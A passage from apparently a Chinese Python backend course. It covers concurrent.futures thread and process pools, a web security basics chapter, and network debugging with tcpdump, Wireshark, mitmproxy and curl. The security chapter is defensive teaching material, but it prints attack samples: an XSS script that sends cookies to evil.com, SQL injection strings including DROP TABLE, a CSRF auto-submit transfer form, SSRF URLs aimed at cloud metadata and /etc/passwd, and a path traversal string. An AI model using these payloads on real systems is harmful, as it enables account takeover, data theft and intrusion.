池化技术的核心思想：**预先创建一定数量的工作线程/进程，任务提交到队列，工作线程/进程从队列取任务执行，执行完不销毁而是等待下一个任务。**

优势：
- ✅ 减少创建销毁开销，复用已存在的worker
- ✅ 控制并发数量，防止资源耗尽
- ✅ 统一管理，提供任务提交、结果获取、异常处理等API
- ✅ 代码更简洁，不用手动管理线程/进程生命周期

## 二、concurrent.futures模块

Python标准库\`concurrent.futures\`提供了两个核心的池实现：
- \`ThreadPoolExecutor\`：线程池
- \`ProcessPoolExecutor\`：进程池

它们都实现了相同的\`Executor\`接口，使用方法一致，可以很方便地切换。

### 2.1 核心API

| 方法 | 说明 |
|------|------|
| \`Executor(max_workers)\` | 创建池，指定最大worker数量 |
| \`submit(fn, *args, **kwargs)\` | 提交单个任务，返回Future对象 |
| \`map(fn, *iterables)\` | 对可迭代对象每个元素执行fn，返回结果迭代器（按提交顺序） |
| \`shutdown(wait=True)\` | 关闭池，等待所有任务完成 |
| \`Future.result(timeout=None)\` | 获取任务结果（阻塞直到完成或超时） |
| \`Future.done()\` | 任务是否完成 |
| \`Future.exception(timeout=None)\` | 获取任务抛出的异常 |
| \`Future.add_done_callback(fn)\` | 任务完成时的回调函数 |

## 三、ThreadPoolExecutor线程池

### 3.1 基本使用

\`\`\`python
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

def fetch_url(url):
    """下载URL内容"""
    start = time.time()
    try:
        resp = requests.get(url, timeout=10)
        elapsed = time.time() - start
        return {
            'url': url,
            'status': resp.status_code,
            'size': len(resp.content),
            'time': elapsed
        }
    except Exception as e:
        return {'url': url, 'error': str(e)}

def main():
    urls = [
        'https://www.baidu.com',
        'https://www.taobao.com',
        'https://www.jd.com',
        'https://www.bilibili.com',
        'https://www.zhihu.com',
    ] * 5  # 25个请求
    
    # 方式1：使用with语句自动管理shutdown
    start = time.time()
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        # 提交所有任务
        futures = {executor.submit(fetch_url, url): url for url in urls}
        
        # as_completed：哪个任务先完成就先处理哪个结果（不按顺序）
        for future in as_completed(futures):
            url = futures[future]
            try:
                result = future.result()
                if 'error' in result:
                    print(f'[ERROR] {url}: {result["error"]}')
                else:
                    print(f'[{result["status"]}] {url}: {result["size"]} bytes, {result["time"]:.2f}s')
            except Exception as e:
                print(f'[EXCEPTION] {url}: {e}')
    
    print(f'总耗时: {time.time() - start:.2f}s')

if __name__ == '__main__':
    main()
\`\`\`

### 3.2 map方法：按顺序返回结果

\`\`\`python
import time
from concurrent.futures import ThreadPoolExecutor

def task(n):
    time.sleep(0.5)
    return n * n

def main():
    numbers = [1, 2, 3, 4, 5]
    
    with ThreadPoolExecutor(max_workers=2) as executor:
        # map按照输入顺序返回结果，而不是完成顺序
        results = executor.map(task, numbers)
        for result in results:
            print(f'结果: {result}')
    # 输出顺序一定是: 1, 4, 9, 16, 25

if __name__ == '__main__':
    main()
\`\`\`

**submit vs map 对比：**

| 特性 | submit | map |
|------|--------|-----|
| 返回值 | Future对象 | 直接是结果 |
| 结果顺序 | as_completed按完成顺序获取，或按future顺序 | 严格按输入顺序返回 |
| 异常处理 | future.result()时抛出 | 迭代到对应位置时抛出 |
| 适用场景 | 任务参数各异、需要灵活处理、需要回调 | 对一组相同操作并行处理 |

### 3.3 Future对象与回调

\`\`\`python
import time
from concurrent.futures import ThreadPoolExecutor

def long_running_task(n):
    time.sleep(1)
    if n == 3:
        raise ValueError(f'n={n} is invalid!')
    return n * 2

def done_callback(future):
    """任务完成回调"""
    try:
        result = future.result()
        print(f'[回调] 任务完成，结果: {result}')
    except Exception as e:
        print(f'[回调] 任务失败: {e}')

def main():
    with ThreadPoolExecutor(max_workers=2) as executor:
        for i in range(5):
            future = executor.submit(long_running_task, i)
            future.add_done_callback(done_callback)
    
    # with块结束自动等待所有任务完成
    print('所有任务已提交，等待完成...')

if __name__ == '__main__':
    main()
\`\`\`

## 四、ProcessPoolExecutor进程池

### 4.1 基本使用

ProcessPoolExecutor接口和ThreadPool完全一样，但底层用多进程实现，适合CPU密集型任务：

\`\`\`python
import time
import math
from concurrent.futures import ProcessPoolExecutor

def is_prime(n):
    """判断素数（CPU密集型）"""
    if n < 2:
        return False
    if n == 2:
        return True
    if n % 2 == 0:
        return False
    sqrt_n = int(math.isqrt(n))
    for i in range(3, sqrt_n + 1, 2):
        if n % i == 0:
            return False
    return True

def count_primes_in_range(start, end):
    """统计区间内的素数个数"""
    count = 0
    for n in range(start, end):
        if is_prime(n):
            count += 1
    return count

def main():
    # 统计0~1,000,000之间的素数个数
    total_range = 1_000_000
    workers = 4
    chunk_size = total_range // workers
    
    ranges = [
        (i * chunk_size, (i + 1) * chunk_size if i < workers - 1 else total_range)
        for i in range(workers)
    ]
    
    # 单进程基准
    start = time.time()
    single_result = sum(count_primes_in_range(s, e) for s, e in ranges)
    print(f'单进程: {single_result}个素数，耗时{time.time()-start:.2f}s')
    
    # 进程池并行
    start = time.time()
    with ProcessPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(count_primes_in_range, s, e) for s, e in ranges]
        multi_result = sum(f.result() for f in futures)
    print(f'{workers}进程: {multi_result}个素数，耗时{time.time()-start:.2f}s')

if __name__ == '__main__':
    main()
\`\`\`

**典型输出（4核CPU）：**
\`\`\`
单进程: 78498个素数，耗时2.85s
4进程: 78498个素数，耗时0.82s
\`\`\`
加速比约3.5倍，接近4核线性加速！

### 4.2 进程池注意事项

使用ProcessPoolExecutor有几个重要约束：
1. **函数必须可pickle序列化**：因为要跨进程传输，lambda、闭包函数、内部函数等可能无法序列化
2. **\`__name__ == '__main__'\`保护**：Windows和macOS上必须放在if __name__ == '__main__'块中，否则会无限递归创建进程
3. **参数和返回值也必须可pickle**：不能传不能序列化的对象（如数据库连接、socket、打开的文件句柄）
4. **每个进程有独立内存空间**：全局变量修改不共享

\`\`\`python
from concurrent.futures import ProcessPoolExecutor
# ❌ 错误：lambda无法序列化
# with ProcessPoolExecutor() as executor:
#     executor.map(lambda x: x*2, [1,2,3])

# ✅ 正确：使用顶层函数
def double(x):
    return x * 2

with ProcessPoolExecutor() as executor:
    results = list(executor.map(double, [1,2,3]))
\`\`\`

## 五、线程池/进程池在Web开发中的应用

### 5.1 FastAPI中使用线程池处理阻塞操作

异步Web框架（FastAPI/Starlette）中遇到同步阻塞调用（如旧版ORM、同步文件读写），不能直接在协程中调用，会阻塞事件循环。正确做法是放到线程池中运行：

\`\`\`python
import time
from fastapi import FastAPI
from concurrent.futures import ThreadPoolExecutor
import asyncio

app = FastAPI()

# 创建线程池（全局复用，不要每次请求创建！）
executor = ThreadPoolExecutor(max_workers=8)

def blocking_db_query(user_id: int):
    """模拟阻塞的数据库查询"""
    time.sleep(1)  # 模拟数据库查询耗时
    return {'user_id': user_id, 'name': f'User{user_id}'}

@app.get('/user/{user_id}')
async def get_user(user_id: int):
    loop = asyncio.get_running_loop()
    # run_in_executor将阻塞函数放到线程池运行，不阻塞事件循环
    result = await loop.run_in_executor(
        executor,
        blocking_db_query,
        user_id
    )
    return result

# 启动：uvicorn main:app --workers 4
\`\`\`

### 5.2 进程池处理CPU密集型任务

Web应用中遇到CPU密集任务（如图像处理、报表生成、复杂计算），不应在请求处理线程/协程中直接执行，应该用进程池：

\`\`\`python
import os
import time
from fastapi import FastAPI
from concurrent.futures import ProcessPoolExecutor
from pydantic import BaseModel
import asyncio

app = FastAPI()

# 进程池（每个worker进程创建自己的进程池子进程，注意不要太多）
process_pool = ProcessPoolExecutor(max_workers=2)

# CPU密集任务必须是顶层函数，可pickle
def generate_report_task(report_id: int):
    """生成报表（CPU密集）"""
    start = time.time()
    # 模拟复杂计算
    total = 0
    for i in range(10_000_000):
        total += i * i % 99991
    elapsed = time.time() - start
    return {
        'report_id': report_id,
        'result': total,
        'compute_time': elapsed,
        'pid': os.getpid()
    }

class ReportRequest(BaseModel):
    report_id: int

@app.post('/report')
async def generate_report(req: ReportRequest):
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(
        process_pool,
        generate_report_task,
        req.report_id
    )
    return result

@app.on_event('shutdown')
async def shutdown():
    process_pool.shutdown(wait=True)
\`\`\`

## 六、池大小如何设置

### 6.1 线程池大小

线程池大小不是越大越好。设置公式：

- **CPU密集型**：\`max_workers = CPU核心数 + 1\`（但实际上CPU密集应该用进程池）
- **IO密集型**：\`max_workers = CPU核心数 * (1 + 平均IO等待时间/平均CPU计算时间)\`

**经验值：**
- 普通Web服务调用数据库/Redis：20-50个线程足够
- HTTP爬虫：可以适当大一些（如50-200），但受限于目标网站并发限制
- 默认值：Python3.8+ ThreadPoolExecutor默认max_workers = min(32, os.cpu_count() + 4)

### 6.2 进程池大小

- **CPU密集型**：\`max_workers = CPU核心数\`（或CPU核心数-1，留一个核心处理主进程和系统）
- **IO密集型**：进程池不适合IO密集，应该用线程池或协程
- **默认值**：ProcessPoolExecutor默认max_workers = os.cpu_count()

## 七、高级用法

### 7.1 等待多个任务完成

\`\`\`python
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED, ALL_COMPLETED

with ThreadPoolExecutor(max_workers=5) as executor:
    futures = [executor.submit(task, i) for i in range(10)]
    
    # 等待所有任务完成（默认）
    done, not_done = wait(futures, return_when=ALL_COMPLETED)
    
    # 等待第一个任务完成就返回
    # done, not_done = wait(futures, return_when=FIRST_COMPLETED)
    
    # 也可以设置超时
    # done, not_done = wait(futures, timeout=5)
    
    for f in done:
        print(f.result())
\`\`\`

### 7.2 超时处理

\`\`\`python
from concurrent.futures import ThreadPoolExecutor, TimeoutError

def slow_task():
    import time
    time.sleep(10)
    return 'done'

with ThreadPoolExecutor(max_workers=1) as executor:
    future = executor.submit(slow_task)
    try:
        result = future.result(timeout=2)  # 最多等2秒
        print(result)
    except TimeoutError:
        print('任务超时！')
        # future.cancel() 尝试取消（如果还没开始执行的话）
\`\`\`

## 八、常见坑点

### 坑点1：在进程池/线程池中又创建池，导致进程/线程爆炸
不要在worker函数里再创建新的线程池/进程池，应该创建全局的池复用。

### 坑点2：进程池使用lambda/内部函数
ProcessPoolExecutor要求函数可序列化，lambda、嵌套函数、闭包等在多进程下不可用，报错\`PicklingError\`。必须定义为模块顶层函数。

### 坑点3：忘记\`if __name__ == '__main__'\`
在Windows/macOS上spawn模式创建进程，没有这个保护会递归执行主模块导致无限创建进程报错。

### 坑点4：共享数据库连接等资源
每个进程/线程需要自己的数据库连接，不能跨进程/线程共享连接。线程池可以用线程局部变量(threading.local())实现每个线程一个连接。

### 坑点5：在FastAPI异步接口中直接用requests
这会阻塞整个事件循环，只能同时处理少量请求。必须用\`aiohttp\`或者放到线程池\`run_in_executor\`中运行。

## 九、面试常见问题

**Q: 线程池为什么能提升性能？是不是线程越多越好？**
A: 线程池减少了线程创建销毁开销，控制并发数量避免资源耗尽和过度切换。线程不是越多越好：太多线程增加内存占用（每个线程默认8MB栈）和上下文切换开销，IO密集型可以多一些，CPU密集型接近核心数最好。

**Q: ThreadPoolExecutor和ProcessPoolExecutor区别？如何选择？**
A: ThreadPool基于多线程，受GIL影响，适合IO密集型；ProcessPool基于多进程，绕过GIL，适合CPU密集型。API完全一致。进程池需要函数和参数可pickle，有跨进程通信开销。

**Q: concurrent.futures和直接用threading/multiprocessing比有什么优势？**
A: futures提供了更高级的抽象：统一的submit/map/Future接口，自动管理生命周期，方便的异常处理和回调，as_completed/wait等批量处理工具，代码更简洁不易错。

**Q: 异步框架(FastAPI)里为什么要把阻塞操作扔到线程池？**
A: asyncio事件循环是单线程的，在协程中直接调用阻塞函数（如requests、time.sleep、同步ORM）会阻塞整个事件循环，导致这期间所有其他请求都无法处理。放到线程池运行，事件循环可以继续处理其他请求，等阻塞操作完成后再回来处理结果。
`,
  },
  {
    id: "pyb-3-7",
    group: "Python网络编程",
    icon: "🔌",
    title: "网络安全基础",
    content: `# 网络安全基础

## 一、Web安全概述

作为后端工程师，网络安全是必修课。一个小小的安全漏洞可能导致用户数据泄露、服务器被控制、公司遭受巨大损失。本章我们学习最常见的Web攻击方式及其防御：

- SQL注入
- XSS跨站脚本攻击
- CSRF跨站请求伪造
- SSRF服务端请求伪造
- 其他常见攻击

## 二、SQL注入

### 2.1 什么是SQL注入

SQL注入（SQL Injection）是最古老、最危险的Web攻击方式之一。攻击者通过在输入参数中插入恶意SQL语句片段，欺骗服务器执行非预期的SQL命令，从而绕过认证、窃取数据、修改甚至删除数据库。

**经典案例：万能密码**
\`\`\`python
# ❌ 错误！字符串拼接SQL
username = request.args.get('username')
password = request.args.get('password')

sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
# 如果用户输入: username=admin' -- 
# SQL变为: SELECT * FROM users WHERE username='admin' -- ' AND password='xxx'
# -- 是SQL注释，后面的密码检查被注释掉了！直接以admin身份登录！

# 更坏的情况: username='; DROP TABLE users; --
# 直接删除users表！
cursor.execute(sql)
\`\`\`

### 2.2 注入类型

| 类型 | 说明 |
|------|------|
| 基于布尔的盲注 | 通过页面返回的真假判断信息 |
| 基于时间的盲注 | 通过sleep()等延时函数判断 |
| 基于报错的注入 | 通过数据库错误信息获取数据 |
| 联合查询注入 | 使用UNION拼接查询结果 |
| 堆叠查询 | 执行多条SQL语句 |

### 2.3 防御方式

**1. 永远使用参数化查询（预编译语句）—— 最根本的防御**

\`\`\`python
# ✅ 正确！参数化查询，ORM底层也是这么做的
username = request.args.get('username')
password = request.args.get('password')

# 参数用%s或?占位，不要自己拼接字符串
sql = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(sql, (username, password))
# 数据库驱动会自动对参数进行转义，SQL注入不可能发生
\`\`\`

**2. 使用ORM框架**
\`\`\`python
# ✅ 使用SQLAlchemy/ORM，完全避免手写SQL
user = db.session.query(User).filter(
    User.username == username,
    User.password == password
).first()
\`\`\`

**3. 最小权限原则**
- 应用使用的数据库账号只授予必要权限
- 不要用root/sa账号连接数据库
- 禁止DROP、ALTER等危险权限给应用账号

**4. 输入验证**
- 对预期为数字/邮箱/手机号等格式的参数做格式校验
- 特殊字符过滤（但不能只依赖这个，参数化才是根本）

**5. 错误信息不暴露给用户**
- 生产环境关闭数据库错误回显
- 不要把SQL异常信息返回给前端

## 三、XSS跨站脚本攻击

### 3.1 什么是XSS

XSS（Cross-Site Scripting）是攻击者向网页中注入恶意脚本，当用户访问该页面时，恶意脚本在用户浏览器中执行，从而窃取用户信息、模拟用户操作、甚至发动进一步攻击。

### 3.2 XSS类型

| 类型 | 存储位置 | 触发方式 | 危害 |
|------|---------|---------|------|
| 存储型XSS | 数据库/服务器（评论、留言板等） | 所有访问该页面的用户都会触发 | 极高，影响大量用户 |
| 反射型XSS | URL参数中 | 需要诱使用户点击恶意链接 | 中，针对特定用户 |
| DOM型XSS | 前端DOM中，不经过服务器 | 前端JS直接把用户输入插入DOM | 中，前端漏洞 |

**存储型XSS示例：**
1. 攻击者在评论区提交：\`<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>\`
2. 服务器未做转义，存入数据库
3. 其他用户访问该页面，评论内容被渲染到HTML
4. 恶意脚本在用户浏览器执行，Cookie被发送到攻击者服务器
5. 攻击者用窃取的Cookie登录用户账号

### 3.3 防御方式

**1. 输出转义（最根本防御）**
对任何用户输入的内容，在输出到HTML时都要进行转义：

| 字符 | 转义为 |
|------|--------|
| \`<\` | \`&lt;\` |
| \`>\` | \`&gt;\` |
| \`&\` | \`&amp;\` |
| \`"\` | \`&quot;\` |
| \`'\` | \`&#x27;\` |
| \`/\` | \`&#x2F;\` |

\`\`\`python
# Python中可以用html模块转义
import html

user_comment = '<script>alert("XSS")</script>'
safe_comment = html.escape(user_comment)
print(safe_comment)
# &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
# 渲染到页面时会显示为文本，不会被当作脚本执行
\`\`\`

现代模板引擎（Jinja2、Django Templates、React/Vue默认）都自动做HTML转义。

**2. 设置Content-Security-Policy (CSP)**
CSP是浏览器的安全机制，可以限制页面能加载哪些资源，禁止执行内联脚本：

\`\`\`python
# Flask中设置CSP头
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "  # 默认只加载同源资源
        "script-src 'self'; "   # 脚本只从本站加载
        "style-src 'self' 'unsafe-inline'; "  # 样式
        "img-src 'self' data: https:; "  # 图片
        "object-src 'none'; "  # 禁止插件
        "frame-ancestors 'none';"  # 禁止被iframe嵌入
    )
    return response
\`\`\`

**3. HttpOnly Cookie**
敏感Cookie（如session id）设置HttpOnly属性，JS无法通过document.cookie读取，即使发生XSS也窃取不了：

\`\`\`python
# Flask中设置响应Cookie
response.set_cookie(
    'session_id',
    value=session_id,
    httponly=True,   # JS无法读取
    secure=True,     # 只在HTTPS下传输
    samesite='Lax'   # 防CSRF
)
\`\`\`

**4. X-XSS-Protection头部**
\`\`\`
X-XSS-Protection: 1; mode=block
\`\`\`
启用浏览器内置的XSS过滤器。

## 四、CSRF跨站请求伪造

### 4.1 什么是CSRF

CSRF（Cross-Site Request Forgery）跨站请求伪造，是攻击者诱导已登录用户在第三方网站向目标网站发送请求，利用用户的登录状态（Cookie自动携带）执行非授权操作。

**攻击流程：**
1. 用户登录了银行网站\`bank.com\`，浏览器保存了Cookie
2. 用户被诱导访问恶意网站\`evil.com\`
3. 恶意网站中有一个表单或自动提交的JS：
   \`\`\`html
   <form action="https://bank.com/transfer" method="POST">
       <input type="hidden" name="to" value="attacker">
       <input type="hidden" name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>
   \`\`\`
4. 用户浏览器自动带上\`bank.com\`的Cookie，银行服务器以为是用户本人操作，转账成功

### 4.2 防御方式

**1. CSRF Token（最常用）**
- 用户访问表单页面时，服务器生成一个随机token，存在session中，同时渲染到表单隐藏字段
- 提交表单时必须携带这个token，服务器验证token是否匹配
- 攻击者的第三方网站无法获取这个token（同源策略），无法构造请求

\`\`\`html
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6...">
    <!-- 其他表单字段 -->
</form>
\`\`\`

**2. SameSite Cookie属性**
SameSite设置为Strict或Lax，跨站请求时浏览器不会发送Cookie：

\`\`\`python
response.set_cookie('session_id', session_id, samesite='Lax')
# Strict：完全禁止第三方Cookie
# Lax：允许链接跳转等安全GET请求携带Cookie，POST/iframe/IMG等不携带
# None：无限制（必须同时Secure）
\`\`\`

**3. 验证Referer/Origin头部**
检查请求的来源页面是否是本站，但Referer可能被禁用或伪造，作为辅助手段。

**4. 二次验证**
关键操作（转账、修改密码）要求输入密码或短信验证码。

## 五、SSRF服务端请求伪造

### 5.1 什么是SSRF

SSRF（Server-Side Request Forgery）服务端请求伪造，攻击者让服务器发送精心构造的请求，访问服务器所在内网的资源，因为服务器在内网有更高权限，可以访问外网无法访问的内部服务。

**典型场景：**
- 图片上传/下载功能：从URL获取图片
- Webhook功能
- 在线翻译、PDF生成等需要访问外部URL的功能

攻击者传入的URL不是正常的外网地址，而是：
- \`http://127.0.0.1:6379\` → 访问本地Redis，可能未授权访问getshell
- \`http://192.168.1.1/admin\` → 访问内网管理后台
- \`file:///etc/passwd\` → 读取本地文件
- \`http://169.254.169.254/latest/meta-data/\` → AWS元数据，获取AK/SK密钥

### 5.2 防御方式

1. **严格校验URL**
   - 禁止访问内网IP段：10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、127.0.0.0/8、169.254.0.0/16
   - 禁止非HTTP/HTTPS协议（file://、gopher://、dict://等）
   - 对域名做DNS解析，解析到的IP也要校验（防止DNS rebinding）

2. **禁用不必要的协议**
   - 只允许http://和https://

3. **网络隔离**
   - 应用服务器放在DMZ区，限制能访问的内网范围
   - 服务器不授予访问内网敏感服务的权限

4. **认证不对等**
   - 不要因为请求来自服务器就信任，服务间调用也要认证

## 六、其他常见攻击

### 6.1 暴力破解/撞库
- **防御**：登录失败次数限制、验证码、IP限流、双因素认证、强密码策略

### 6.2 文件上传漏洞
攻击者上传恶意脚本（如.php/.jsp/.py）到服务器执行
- **防御**：
  - 严格校验文件类型（检查文件头魔数，不只看扩展名）
  - 文件存储目录不可执行
  - 重命名文件名，不要用用户提供的文件名
  - 文件存储到独立域名/CDN，避免同源攻击

### 6.3 目录穿越
通过\`../../etc/passwd\`等访问非预期文件
- **防御**：
  - 路径规范化后判断是否在预期目录内
  - 不要将用户输入直接拼接进文件路径

\`\`\`python
import os

def safe_path(base_dir: str, user_filename: str) -> str:
    # 拼接并规范化路径
    full_path = os.path.normpath(os.path.join(base_dir, user_filename))
    # 检查最终路径是否在base_dir内
    if not full_path.startswith(os.path.abspath(base_dir) + os.sep):
        raise ValueError('非法路径！')
    return full_path
\`\`\`

### 6.4 点击劫持(Clickjacking)
用透明iframe覆盖在页面上诱导用户点击
- **防御**：设置\`X-Frame-Options: DENY\`或CSP \`frame-ancestors 'none'\`禁止被嵌入iframe

### 6.5 拒绝服务攻击(DoS/DDoS)
- **防御**：限流、CDN、WAF、云清洗、SYN Cookie等

## 七、安全响应头配置

给所有响应添加安全相关的HTTP头部：

\`\`\`python
# Flask安全头中间件
@app.after_request
def set_security_headers(response):
    # 防止MIME类型嗅探
    response.headers['X-Content-Type-Options'] = 'nosniff'
    # XSS防护
    response.headers['X-XSS-Protection'] = '1; mode=block'
    # 点击劫持防护
    response.headers['X-Frame-Options'] = 'DENY'
    # HTTPS强制跳转（开启HSTS）
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    # Referrer策略
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    # 权限策略
    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
    return response
\`\`\`

## 八、安全开发原则

1. **永远不要信任用户输入**：所有客户端输入都是不可信的，包括GET/POST参数、Cookie、Header、文件上传
2. **最小权限原则**：应用、数据库、服务器都使用最小必要权限
3. **纵深防御**：不要依赖单一防御手段，多层防护
4. **默认安全**：框架配置默认是安全的，不要为了方便关闭安全选项
5. **安全不是功能，是属性**：从设计阶段就考虑安全，而不是事后补救
6. **及时更新依赖**：定期更新框架和依赖库，修复已知CVE漏洞
   - \`pip audit\`或\`safety check\`检查依赖漏洞
   - 关注CVE公告，及时升级

## 九、常见坑点

### 坑点1：用ORM就绝对安全了吗？
不！如果用ORM的raw方法拼接SQL，还是会有SQL注入。使用ORM也要用参数化查询。

### 坑点2：只在前端做XSS/输入校验
前端校验是为了用户体验，后端必须重新校验！攻击者可以绕过前端JS直接发请求。

### 坑点3：CSRF只防POST不防GET
不要用GET请求执行修改操作（转账、删除、修改设置），GET应该只用于查询。

### 坑点4：自己写安全过滤函数
不要自己发明安全过滤，使用成熟框架/库的安全功能，专业的安全库经过大量安全研究者检验。

## 十、面试常见问题

**Q: SQL注入原理？如何防御？**
A: 原理是用户输入被当作SQL代码执行，通过拼接恶意SQL片段绕过认证或窃取数据。根本防御是永远使用参数化查询/预编译语句，不要拼接SQL；附加ORM、最小权限、错误不回显等措施。

**Q: XSS和CSRF的区别？**
A: XSS是攻击者注入脚本，在用户浏览器执行恶意代码，利用用户对网站的信任；CSRF是利用用户已登录的身份，伪造用户请求，利用网站对用户浏览器的信任。防御方式也不同：XSS主要靠输出转义+CSP，CSRF主要靠Token+SameSite。

**Q: HttpOnly Cookie能防什么？防不了什么？**
A: HttpOnly防止JS通过document.cookie读取Cookie，能防御XSS窃取Cookie，但不能防御CSRF（因为CSRF是浏览器自动携带Cookie，不需要JS读取），CSRF需要SameSite或CSRF Token。

**Q: 什么是SSRF？如何防御？**
A: SSRF是攻击者让服务器发送请求到内网/本地敏感服务，利用服务器的网络权限探测或攻击内网。防御：严格校验URL和解析后的IP，禁止内网地址和非HTTP协议，做好网络隔离。
`,
  },
  {
    id: "pyb-3-8",
    group: "Python网络编程",
    icon: "🔌",
    title: "网络调试与抓包",
    content: `# 网络调试与抓包

## 一、为什么需要网络调试

开发和排查网络问题时，我们经常需要回答这些问题：
- 程序到底发了什么数据出去？
- 对方返回的原始响应是什么？
- 连接卡在了哪一步？DNS？TCP握手？TLS？
- 为什么请求超时了？是网络不通还是服务端没响应？
- 头部/Body是不是哪里格式不对？
- 框架是不是偷偷加了什么头部？

熟练使用抓包和调试工具是后端工程师的必备技能。

## 二、tcpdump：命令行抓包神器

tcpdump是Linux/Unix下最常用的命令行抓包工具，可以在服务器终端直接抓取网络数据包，非常适合远程服务器调试。

### 2.1 常用命令

**基础语法：**
\`\`\`bash
# 抓取指定网卡的所有包
sudo tcpdump -i eth0

# 抓取任意网卡的包
sudo tcpdump -i any

# 只抓80端口的TCP包
sudo tcpdump -i any tcp port 80

# 抓取指定主机的流量
sudo tcpdump -i any host 192.168.1.100

# 抓取源或目标是指定端口
sudo tcpdump -i any src port 8080 or dst port 8080

# 保存到文件（可以用Wireshark打开分析）
sudo tcpdump -i any -w capture.pcap tcp port 8080

# 读取保存的pcap文件
tcpdump -r capture.pcap
\`\`\`

**常用选项：**
| 选项 | 说明 |
|------|------|
| -i <网卡> | 指定网卡，any表示所有 |
| -w <文件> | 写入pcap文件 |
| -r <文件> | 读取pcap文件 |
| -n | 不解析域名（直接显示IP，更快） |
| -nn | 不解析域名和端口名（直接显示端口号） |
| -A | 以ASCII显示包内容（看HTTP文本很方便） |
| -X | 同时以十六进制和ASCII显示 |
| -s 0 | 抓取完整包（不截断） |
| -c <N> | 抓N个包后退出 |
| -v/-vv/-vvv | 更详细输出 |

**实战：抓取HTTP请求并显示内容**
\`\`\`bash
# 抓取8080端口的TCP包，显示ASCII内容，不截断
sudo tcpdump -i any -A -s 0 tcp port 8080
\`\`\`

**常用过滤表达式：**
\`\`\`bash
# TCP握手包（SYN包）
sudo tcpdump -i any 'tcp[tcpflags] & tcp-syn != 0'

# 指定源IP和目标端口
sudo tcpdump -i any src 10.0.0.5 and dst port 443

# 抓取HTTP GET/POST请求
sudo tcpdump -i any -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'
\`\`\`

## 三、Wireshark：图形化抓包分析

Wireshark是功能最强大的图形化网络协议分析工具，支持几百种协议解析，可以非常直观地分析网络流量。

### 3.1 基本使用流程

1. 选择要抓包的网卡（如Wi-Fi、eth0、Loopback lo0）
2. 设置抓包过滤（如\`tcp port 8080\`）
3. 开始抓包
4. 触发你的网络请求
5. 停止抓包，分析数据包

### 3.2 显示过滤器常用语法

抓完包后，可以用显示过滤器筛选：

| 过滤表达式 | 说明 |
|-----------|------|
| \`http\` | 只显示HTTP协议包 |
| \`tcp.port == 8080\` | 8080端口的TCP包 |
| \`ip.addr == 127.0.0.1\` | 与127.0.0.1通信的包 |
| \`http.request.method == "POST"\` | POST请求 |
| \`http.response.code == 404\` | 404响应 |
| \`tcp.flags.syn == 1 and tcp.flags.ack == 0\` | TCP SYN包（连接请求） |
| \`tls\` | TLS/HTTPS包 |
| \`dns\` | DNS查询 |
| \`follow tcp stream\` | 跟踪TCP流（查看完整HTTP请求响应！右键→Follow→TCP Stream） |

### 3.3 跟踪TCP流：调试HTTP神器

这是Wireshark最实用的功能之一：右键任意一个包 → Follow → TCP Stream，可以看到完整的TCP双向数据流，HTTP请求和响应完整呈现，像看日志一样方便。

\`\`\`
GET /api/user HTTP/1.1
Host: localhost:8080
User-Agent: curl/7.79.1
Accept: */*

HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 45
Server: Werkzeug/2.0.3 Python/3.9.7

{"id": 1, "name": "test", "email": "test@example.com"}
\`\`\`

### 3.4 HTTPS抓包：解密TLS流量

HTTPS是加密的，默认Wireshark看到的是乱码。要解密HTTPS可以：

**方法1：设置SSLKEYLOGFILE环境变量**
浏览器和curl支持将TLS会话密钥导出到文件，Wireshark可以读取这个文件解密流量：
\`\`\`bash
# macOS/Linux
export SSLKEYLOGFILE=~/ssl-keys.log
# Windows
set SSLKEYLOGFILE=C:\\ssl-keys.log

# 然后启动Chrome/Firefox/curl，会自动写入密钥
# Wireshark: 设置→Protocols→TLS→(Pre)-Master-Secret log filename 选择这个文件
\`\`\`

**方法2：使用Charles/Fiddler等代理抓包工具**
通过中间人的方式抓HTTPS包，需要安装根证书。

## 四、Charles/mitmproxy：代理抓包工具

这类工具作为HTTP/HTTPS代理，让你的客户端流量经过代理，可以方便地查看和修改请求响应。

### 4.1 Charles（图形化，macOS/Windows）

- 配置代理后，所有HTTP/HTTPS流量都可以看到
- 支持断点、修改请求/响应、重放请求、模拟慢速网络
- 安装Charles根证书后可以抓HTTPS
- 移动端也可以设置代理到Charles来抓App的包

### 4.2 mitmproxy（命令行）

mitmproxy是开源的命令行代理工具，功能也很强大：

\`\`\`bash
# 安装
pip install mitmproxy

# 启动代理（默认监听8080端口）
mitmproxy  # 交互式界面
# 或 mitmweb 启动Web界面
\`\`\`

然后配置客户端HTTP代理为127.0.0.1:8080，安装~/.mitmproxy下的证书即可抓HTTPS。

## 五、curl / httpie：命令行HTTP调试

### 5.1 curl 进阶用法

curl是最常用的命令行HTTP工具，开发者必备：

\`\`\`bash
# 基础GET请求
curl https://example.com

# 显示详细过程（最重要的调试参数！）
# -v 显示请求/响应头部、TLS握手等信息
curl -v https://example.com

# POST请求发送JSON
curl -X POST https://api.example.com/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":"test","password":"123456"}'

# 发送表单数据
curl -X POST https://example.com/form \\
  -d "name=test&age=18"

# 带Cookie
curl -b "sessionid=abc123; token=xyz" https://example.com

# 自定义请求头
curl -H "Authorization: Bearer mytoken" \\
     -H "X-Request-ID: 12345" \\
     https://api.example.com/data

# 跟踪重定向
curl -L https://example.com

# 忽略HTTPS证书验证（测试环境用，生产不要！）
curl -k https://self-signed.badssl.com

